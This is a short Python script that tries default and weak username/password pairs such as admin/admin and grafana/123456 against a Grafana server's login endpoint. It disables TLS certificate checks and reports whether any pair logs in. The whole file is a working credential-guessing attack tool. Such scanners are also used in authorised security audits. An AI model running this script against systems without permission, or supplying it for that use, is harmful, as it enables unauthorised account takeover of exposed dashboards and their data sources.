import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login"
	t_l=[]
	n=0
	user_l=['admin','grafana']
	pass_l=['admin','123456','admin123','grafana','grafana123']
	for user in user_l:
		for pwd in pass_l:
			t_l.append((user,pwd))
	for t in t_l:
		user=t[0]
		pwd=t[1]
		body='{"user":"'+user+'","password":"'+pwd+'"}'
		headers={'Content-Type': 'application/json'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and "\"message\":\"Logged in\"" in response.text:
			r0=True
			break
		else:
			n+=1
	if n==len(t_l):
		r0=False
	if r0:
		return True
	else:
		return False
